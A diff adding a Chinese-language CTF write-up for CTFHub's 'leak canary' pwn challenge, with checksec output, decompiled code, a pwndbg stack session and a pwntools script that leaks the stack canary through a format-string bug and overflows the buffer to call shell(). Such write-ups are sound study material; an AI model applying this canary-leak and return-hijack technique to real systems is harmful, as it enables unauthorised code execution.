@@ -81,6 +81,304 @@ io.interactive()
 
 ------
 
+### leak canary
+
+先`file ./pwn`查看文件类型再`checksec --file=./pwn`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/leak canary]
+└─$ file ./pwn
+./pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4ee12047b4e43af214307fb515bc2ee20ed317aa, not stripped
+                                                                                                      
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/leak canary]
+└─$ checksec --file=./pwn
+[*] '/home/tyd/ctf/pwn/ctfhub/leak canary/pwn'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init(&argc);
+  puts("Welcome to CTFHub leak canary.Input someting:");
+  vuln();
+  return 0;
+}
+```
+
+双击`vuln()`函数查看详情，`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`100`字节，而`read()`函数限制输入`0x200`个字节，显然存在栈溢出漏洞。此外，`buf`变量的地址被`printf()`函数输出啦，存在格式化字符串漏洞。
+
+```c
+unsigned int vuln()
+{
+  int i; // [esp+4h] [ebp-74h]
+  char buf[100]; // [esp+8h] [ebp-70h] BYREF
+  unsigned int v3; // [esp+6Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  for ( i = 0; i <= 1; ++i )
+  {
+    read(0, buf, 0x200u);
+    printf(buf);
+  }
+  return __readgsdword(0x14u) ^ v3;
+}
+```
+
+此外我们还发现了`shell()`函数直接调用`system("/bin/sh")`。
+
+```c
+int shell()
+{
+  return system("/bin/sh");
+}
+```
+
+程序的逻辑很简单，进行两次输入输出。第一次输入时，我们可以利用格式化字符串漏洞拿到`canary`的值，第二次输入时，我们可以利用栈溢出漏洞，填充足够的`padding`并保证`canary`的值不被覆盖，最后劫持程序执行`shell()`。用`pwndbg`来进一步分析程序。
+
+```assembly
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfhub/leak canary]
+└─$ gdb ./pwn
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x08048697 <+0>:     lea    ecx,[esp+0x4]
+   0x0804869b <+4>:     and    esp,0xfffffff0
+   0x0804869e <+7>:     push   DWORD PTR [ecx-0x4]
+   0x080486a1 <+10>:    push   ebp
+   0x080486a2 <+11>:    mov    ebp,esp
+   0x080486a4 <+13>:    push   ebx
+   0x080486a5 <+14>:    push   ecx
+   0x080486a6 <+15>:    call   0x80484e0 <__x86.get_pc_thunk.bx>
+   0x080486ab <+20>:    add    ebx,0x1955
+   0x080486b1 <+26>:    call   0x80485d1 <init>
+   0x080486b6 <+31>:    sub    esp,0xc
+   0x080486b9 <+34>:    lea    eax,[ebx-0x1878]
+   0x080486bf <+40>:    push   eax
+   0x080486c0 <+41>:    call   0x8048450 <puts@plt>
+   0x080486c5 <+46>:    add    esp,0x10
+   0x080486c8 <+49>:    call   0x804862b <vuln>
+   0x080486cd <+54>:    mov    eax,0x0
+   0x080486d2 <+59>:    lea    esp,[ebp-0x8]
+   0x080486d5 <+62>:    pop    ecx
+   0x080486d6 <+63>:    pop    ebx
+   0x080486d7 <+64>:    pop    ebp
+   0x080486d8 <+65>:    lea    esp,[ecx-0x4]
+   0x080486db <+68>:    ret    
+End of assembler dump.
+pwndbg> disassemble vuln
+Dump of assembler code for function vuln:
+   0x0804862b <+0>:     push   ebp
+   0x0804862c <+1>:     mov    ebp,esp
+   0x0804862e <+3>:     push   ebx
+   0x0804862f <+4>:     sub    esp,0x74
+   0x08048632 <+7>:     call   0x80484e0 <__x86.get_pc_thunk.bx>
+   0x08048637 <+12>:    add    ebx,0x19c9
+   0x0804863d <+18>:    mov    eax,gs:0x14
+   0x08048643 <+24>:    mov    DWORD PTR [ebp-0xc],eax
+   0x08048646 <+27>:    xor    eax,eax
+   0x08048648 <+29>:    mov    DWORD PTR [ebp-0x74],0x0
+   0x0804864f <+36>:    jmp    0x804867a <vuln+79>
+   0x08048651 <+38>:    sub    esp,0x4
+   0x08048654 <+41>:    push   0x200
+   0x08048659 <+46>:    lea    eax,[ebp-0x70]
+   0x0804865c <+49>:    push   eax
+   0x0804865d <+50>:    push   0x0
+   0x0804865f <+52>:    call   0x8048420 <read@plt>
+   0x08048664 <+57>:    add    esp,0x10
+   0x08048667 <+60>:    sub    esp,0xc
+   0x0804866a <+63>:    lea    eax,[ebp-0x70]
+   0x0804866d <+66>:    push   eax
+   0x0804866e <+67>:    call   0x8048430 <printf@plt>
+   0x08048673 <+72>:    add    esp,0x10
+   0x08048676 <+75>:    add    DWORD PTR [ebp-0x74],0x1
+   0x0804867a <+79>:    cmp    DWORD PTR [ebp-0x74],0x1
+   0x0804867e <+83>:    jle    0x8048651 <vuln+38>
+   0x08048680 <+85>:    nop
+   0x08048681 <+86>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048684 <+89>:    xor    eax,DWORD PTR gs:0x14
+   0x0804868b <+96>:    je     0x8048692 <vuln+103>
+   0x0804868d <+98>:    call   0x8048750 <__stack_chk_fail_local>
+   0x08048692 <+103>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x08048695 <+106>:   leave  
+   0x08048696 <+107>:   ret    
+End of assembler dump.
+pwndbg> b *vuln+52
+Breakpoint 1 at 0x804865f
+pwndbg> run
+Starting program: /home/tyd/ctf/pwn/ctfhub/leak canary/pwn 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome to CTFHub leak canary.Input someting:
+
+Breakpoint 1, 0x0804865f in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
+ EAX  0xffffcf38 ◂— 0x1
+ EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
+ ECX  0xf7e1e9b8 (_IO_stdfile_1_lock) ◂— 0x0
+ EDX  0x1
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+ ESI  0x80486e0 (__libc_csu_init) ◂— push   ebp
+ EBP  0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
+ ESP  0xffffcf20 ◂— 0x0
+ EIP  0x804865f (vuln+52) —▸ 0xfffdbce8 ◂— 0xfffdbce8
+──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
+ ► 0x804865f <vuln+52>    call   read@plt                     <read@plt>
+        fd: 0x0 (/dev/pts/8)
+        buf: 0xffffcf38 ◂— 0x1
+        nbytes: 0x200
+ 
+   0x8048664 <vuln+57>    add    esp, 0x10
+   0x8048667 <vuln+60>    sub    esp, 0xc
+   0x804866a <vuln+63>    lea    eax, [ebp - 0x70]
+   0x804866d <vuln+66>    push   eax
+   0x804866e <vuln+67>    call   printf@plt                     <printf@plt>
+ 
+   0x8048673 <vuln+72>    add    esp, 0x10
+   0x8048676 <vuln+75>    add    dword ptr [ebp - 0x74], 1
+   0x804867a <vuln+79>    cmp    dword ptr [ebp - 0x74], 1
+   0x804867e <vuln+83>    jle    vuln+38                     <vuln+38>
+ 
+   0x8048680 <vuln+85>    nop    
+──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
+00:0000│ esp 0xffffcf20 ◂— 0x0
+01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 0x1
+02:0008│     0xffffcf28 ◂— 0x200
+03:000c│     0xffffcf2c —▸ 0x8048637 (vuln+12) ◂— add    ebx, 0x19c9
+04:0010│     0xffffcf30 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0014│     0xffffcf34 ◂— 0x0
+06:0018│ eax 0xffffcf38 ◂— 0x1
+07:001c│     0xffffcf3c —▸ 0x804829c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
+────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
+ ► f 0 0x804865f vuln+52
+   f 1 0x80486cd main+54
+   f 2 0xf7c23295 __libc_start_call_main+117
+   f 3 0xf7c23358 __libc_start_main+136
+   f 4 0x80484c2 _start+50
+──────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> n
+AAAA
+0x08048664 in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
+*EAX  0x5
+ EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
+*ECX  0xffffcf38 ◂— 0x41414141 ('AAAA')
+*EDX  0x200
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+ ESI  0x80486e0 (__libc_csu_init) ◂— push   ebp
+ EBP  0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
+ ESP  0xffffcf20 ◂— 0x0
+*EIP  0x8048664 (vuln+57) ◂— add    esp, 0x10
+──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
+   0x804865f <vuln+52>    call   read@plt                     <read@plt>
+ 
+ ► 0x8048664 <vuln+57>    add    esp, 0x10
+   0x8048667 <vuln+60>    sub    esp, 0xc
+   0x804866a <vuln+63>    lea    eax, [ebp - 0x70]
+   0x804866d <vuln+66>    push   eax
+   0x804866e <vuln+67>    call   printf@plt                     <printf@plt>
+ 
+   0x8048673 <vuln+72>    add    esp, 0x10
+   0x8048676 <vuln+75>    add    dword ptr [ebp - 0x74], 1
+   0x804867a <vuln+79>    cmp    dword ptr [ebp - 0x74], 1
+   0x804867e <vuln+83>    jle    vuln+38                     <vuln+38>
+ 
+   0x8048680 <vuln+85>    nop    
+──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
+00:0000│ esp 0xffffcf20 ◂— 0x0
+01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 0x41414141 ('AAAA')
+02:0008│     0xffffcf28 ◂— 0x200
+03:000c│     0xffffcf2c —▸ 0x8048637 (vuln+12) ◂— add    ebx, 0x19c9
+04:0010│     0xffffcf30 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0014│     0xffffcf34 ◂— 0x0
+06:0018│ ecx 0xffffcf38 ◂— 0x41414141 ('AAAA')
+07:001c│     0xffffcf3c —▸ 0x804820a ◂— add    byte ptr [eax], al
+────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
+ ► f 0 0x8048664 vuln+57
+   f 1 0x80486cd main+54
+   f 2 0xf7c23295 __libc_start_call_main+117
+   f 3 0xf7c23358 __libc_start_main+136
+   f 4 0x80484c2 _start+50
+──────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> stack 0x25
+00:0000│ esp 0xffffcf20 ◂— 0x0
+01:0004│     0xffffcf24 —▸ 0xffffcf38 ◂— 0x41414141 ('AAAA')  # 输入的起始地址
+02:0008│     0xffffcf28 ◂— 0x200
+03:000c│     0xffffcf2c —▸ 0x8048637 (vuln+12) ◂— add    ebx, 0x19c9
+04:0010│     0xffffcf30 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0014│     0xffffcf34 ◂— 0x0
+06:0018│ ecx 0xffffcf38 ◂— 0x41414141 ('AAAA')
+07:001c│     0xffffcf3c —▸ 0x804820a ◂— add    byte ptr [eax], al
+08:0020│     0xffffcf40 —▸ 0x804a00c (setbuf@got[plt]) —▸ 0xf7c7b7b0 (setbuf) ◂— sub    esp, 0x10
+09:0024│     0xffffcf44 ◂— 0x20 /* ' ' */
+0a:0028│     0xffffcf48 —▸ 0xf7c80af9 (__overflow+9) ◂— add    ebx, 0x19c4fb
+0b:002c│     0xffffcf4c —▸ 0xf7e1ba40 (_IO_file_jumps) ◂— 0x0
+0c:0030│     0xffffcf50 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+0d:0034│     0xffffcf54 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+0e:0038│     0xffffcf58 —▸ 0xffffcf98 —▸ 0xffffcfb8 ◂— 0x0
+0f:003c│     0xffffcf5c —▸ 0xf7c74f3b (puts+395) ◂— add    esp, 0x10
+10:0040│     0xffffcf60 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+11:0044│     0xffffcf64 ◂— 0xa /* '\n' */
+12:0048│     0xffffcf68 ◂— 0x2d /* '-' */
+13:004c│     0xffffcf6c —▸ 0xf7c7b7c5 (setbuf+21) ◂— add    esp, 0x1c
+14:0050│     0xffffcf70 —▸ 0xf7e1dd00 (_IO_2_1_stderr_) ◂— 0xfbad2087
+15:0054│     0xffffcf74 ◂— 0x7d4
+16:0058│     0xffffcf78 —▸ 0xf7e1de3c (stdout) —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+17:005c│     0xffffcf7c ◂— 0x2d /* '-' */
+18:0060│     0xffffcf80 —▸ 0xffffcfb8 ◂— 0x0
+19:0064│     0xffffcf84 —▸ 0xf7fdb8d0 (_dl_runtime_resolve+16) ◂— pop    edx
+1a:0068│     0xffffcf88 —▸ 0xf7e1e9ac (_IO_stdfile_2_lock) ◂— 0x0
+1b:006c│     0xffffcf8c —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
+1c:0070│     0xffffcf90 —▸ 0x80486e0 (__libc_csu_init) ◂— push   ebp
+1d:0074│     0xffffcf94 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+1e:0078│     0xffffcf98 —▸ 0xffffcfb8 ◂— 0x0
+1f:007c│     0xffffcf9c ◂— 0xe33c6800    # canary在这 $ebp-0xc
+20:0080│     0xffffcfa0 —▸ 0x8048788 ◂— push   edi /* 'Welcome to CTFHub leak canary.Input someting:' */
+21:0084│     0xffffcfa4 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f08 (_DYNAMIC) ◂— 0x1
+22:0088│ ebp 0xffffcfa8 —▸ 0xffffcfb8 ◂— 0x0
+23:008c│     0xffffcfac —▸ 0x80486cd (main+54) ◂— mov    eax, 0
+24:0090│     0xffffcfb0 —▸ 0xffffcfd0 ◂— 0x1
+pwndbg> x/1x $ebp-0xc
+0xffffcf9c:     0xe33c6800
+pwndbg> x/32x $esp
+0xffffcf20:     0x00000000      0xffffcf38      0x00000200      0x08048637
+0xffffcf30:     0xf7e1dda0      0x00000000      0x41414141      0x0804820a
+0xffffcf40:     0x0804a00c      0x00000020      0xf7c80af9      0xf7e1ba40
+0xffffcf50:     0xf7e1dda0      0xf7e1cff4      0xffffcf98      0xf7c74f3b
+0xffffcf60:     0xf7e1dda0      0x0000000a      0x0000002d      0xf7c7b7c5
+0xffffcf70:     0xf7e1dd00      0x000007d4      0xf7e1de3c      0x0000002d
+0xffffcf80:     0xffffcfb8      0xf7fdb8d0      0xf7e1e9ac      0x0804a000
+0xffffcf90:     0x080486e0      0xf7ffcb80      0xffffcfb8      0xe33c6800  # 从0开始数,canary是第31个 
+```
+
+`canary`到栈顶`$esp`的偏移量是`0x1f`即`31`，因此我们可以用`%31$x`来以16进制格式输出无`0x`开头的字符串，拿到`canary`后将其转换为`int`型数值，接着利用栈溢出漏洞。
+
+构造`payload`时，先用`cyclic()`填充`100`个字节的`padding`（`pwndbg`中可以算出`0xffffcf9c-0xffffcf38=100`，`IDA Pro`查看栈结构覆盖到`canary`正好是`0x70-0xc=100`），写入读取到的`canary`数值，并继续填充`0xc`个`padding`覆盖到栈帧`$ebp`，接着写入我们想要跳转的`shell()`函数所在地址。编写`Python`代码求解，拿到`shell`后输入`cat flag`得到`ctfhub{ffa27275c0ee969520de8e2b}`。
+
+```python
+from pwn import *
+
+io = remote('challenge-00924c33bef2cbdc.sandbox.ctfhub.com', 34949)
+io.recvline()
+io.sendline(b'%31$x')
+canary = int(io.recv(8), 16)
+log.success('canary => %#x', canary)
+elf = ELF('./pwn')
+shell_addr = elf.symbols['shell']  # 0x80485a6
+payload = cyclic(0x70-0xc) + p32(canary) + cyclic(0xc) + p32(shell_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ## BUUCTF
 
 ### [test_your_nc](https://buuoj.cn/challenges#test_your_nc)
